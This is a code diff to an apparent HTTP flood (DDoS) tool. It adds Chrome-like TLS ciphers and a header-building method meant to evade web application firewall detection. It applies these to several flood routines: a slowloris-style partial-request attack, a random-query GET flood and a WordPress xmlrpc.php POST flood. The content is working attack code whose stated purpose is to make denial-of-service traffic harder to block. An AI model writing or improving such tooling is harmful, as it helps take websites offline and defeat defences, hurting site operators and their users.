@@ -53,6 +53,13 @@ if hasattr(ssl, "OP_NO_TLSv1"):
     ctx.options |= ssl.OP_NO_TLSv1
 if hasattr(ssl, "OP_NO_TLSv1_1"):
     ctx.options |= ssl.OP_NO_TLSv1_1
+# [OPTIMIZED] Browser-Like Ciphers (Chrome 120+)
+ctx.set_ciphers(
+    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
+    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
+    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
+    "DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384"
+)
 
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
@@ -917,23 +924,51 @@ class HttpFlood(Thread):
         sep = "&" if "?" in target.raw_path_qs else "?"
         rnd = str(randchoice(range(1111, 9999)))
         ver = randchoice(['1.0', '1.1', '1.2'])
+        
+        # Select Random UA initially
+        self.ua = randchoice(self._useragents)
+        
         self._defaultpayload = f"{self._req_type} {target.raw_path_qs}{sep}v={rnd} HTTP/{ver}\r\n"
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
-                         'Cache-Control: max-age=0\r\n'
+                         'Cache-Control: max-age=0\r\n' +
+                         self.build_consistent_headers(self.ua) +
                          'Connection: keep-alive\r\n'
-                         'Sec-Fetch-Dest: document\r\n'
-                         'Sec-Fetch-Mode: navigate\r\n'
-                         'Sec-Fetch-Site: none\r\n'
-                         'Sec-Fetch-User: ?1\r\n'
-                         'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
-        self._payload += "Referer: " + randchoice(referers) + "\r\n"
-        self._payload += "Accept-Language: " + randchoice(langs) + "\r\n"
-        self._payload += "Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
-        self._payload += "Sec-Ch-Ua-Mobile: ?0\r\n"
-        self._payload += "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
+
+    def build_consistent_headers(self, ua: str) -> str:
+        # [OPTIMIZED] Dynamic Header Generation based on User-Agent
+        # Prevents "Inconsistent Hints" detection by WAFs
+        platform = "\"Windows\""
+        mobile = "?0"
+        
+        if "Android" in ua:
+            platform = "\"Android\""
+            mobile = "?1"
+        elif "iPhone" in ua or "iPad" in ua:
+            platform = "\"iOS\""
+            mobile = "?1"
+        elif "Macintosh" in ua or "Mac OS" in ua:
+            platform = "\"macOS\""
+            mobile = "?0"
+        elif "Linux" in ua:
+            platform = "\"Linux\""
+            mobile = "?0"
+
+        headers = (
+            f"Sec-Fetch-Dest: document\r\n"
+            f"Sec-Fetch-Mode: navigate\r\n"
+            f"Sec-Fetch-Site: none\r\n"
+            f"Sec-Fetch-User: ?1\r\n"
+            f"Sec-Gpc: 1\r\n"
+            f"Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
+            f"Sec-Ch-Ua-Mobile: {mobile}\r\n"
+            f"Sec-Ch-Ua-Platform: {platform}\r\n"
+            f"Referer: {randchoice(self._referers)}\r\n"
+            f"Accept-Language: en-US,en;q=0.9\r\n"
+        )
+        return headers
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -1402,10 +1437,14 @@ class HttpFlood(Thread):
         # Ideally keeps the socket open forever.
         
         # 1. Partial Payload (No double \r\n at end)
+        # 1. Partial Payload (No double \r\n at end)
+        ua = randchoice(self._useragents)
+        headers = self.build_consistent_headers(ua)
+        
         partial_payload = (f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n"
                            f"Host: {self._target.authority}\r\n"
-                           f"User-Agent: {randchoice(self._useragents)}\r\n"
-                           f"Accept-language: en-US,en,q=0.5\r\n"
+                           f"User-Agent: {ua}\r\n"
+                           f"{headers}"
                            f"Connection: keep-alive\r\n"
                            f"Keep-Alive: {randint(300, 1000)}\r\n"
                            f"Cache-Control: max-age=0\r\n").encode("utf-8")
@@ -1448,13 +1487,14 @@ class HttpFlood(Thread):
                 # Generate Random Search Query per Request
                 search_query = ProxyTools.Random.rand_str(randint(5, 15))
                 full_path = f"{self._target.raw_path_qs}{sep}s={search_query}"
+                ua = randchoice(self._useragents)
+                headers = self.build_consistent_headers(ua)
                 
                 payload = (f"GET {full_path} HTTP/1.1\r\n"
                            f"Host: {self._target.authority}\r\n"
-                           f"User-Agent: {randchoice(self._useragents)}\r\n"
+                           f"User-Agent: {ua}\r\n"
                            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
-                           f"Accept-Language: en-US,en;q=0.5\r\n"
-                           f"Accept-Encoding: gzip, deflate, br\r\n"
+                           f"{headers}"
                            f"Connection: keep-alive\r\n"
                            f"Upgrade-Insecure-Requests: 1\r\n"
                            f"Cache-Control: no-cache\r\n"
@@ -1483,9 +1523,13 @@ class HttpFlood(Thread):
         if "xmlrpc" not in target_path:
              target_path = "/xmlrpc.php"
 
+        ua = randchoice(self._useragents)
+        headers = self.build_consistent_headers(ua)
+
         post_payload = (f"POST {target_path} HTTP/1.1\r\n"
                         f"Host: {self._target.authority}\r\n"
-                        f"User-Agent: {randchoice(self._useragents)}\r\n"
+                        f"User-Agent: {ua}\r\n"
+                        f"{headers}"
                         f"Content-Type: application/xml\r\n"
                         f"Content-Length: {len(xml_payload)}\r\n"
                         f"Connection: keep-alive\r\n"
